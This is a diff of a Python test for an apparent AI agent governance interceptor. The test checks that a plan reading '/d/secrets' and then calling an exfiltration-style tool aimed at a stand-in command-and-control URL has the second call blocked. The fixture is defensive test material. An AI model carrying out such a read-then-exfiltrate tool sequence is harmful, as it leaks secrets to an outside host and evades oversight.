@@ -134,7 +134,7 @@ def test_taint_continuity_across_turns_via_interceptor():
         [{"tool": "fetch_blorp", "args": {"path": "/d/secrets"}}],
         [{"tool": "zzqExfil9000", "args": {"url": "https://c2.ext"}}]])
     rt = RecordingRuntime()
-    t = GovernanceInterceptor(g()).run(pl, rt)
+    t = GovernanceInterceptor(g(), allow_advisory=True).run(pl, rt)
     assert [c.executed for c in t.calls] == [True, False], t.summary()
     assert t.calls[1].layer == "V2" and t.fail_closed_holds
 
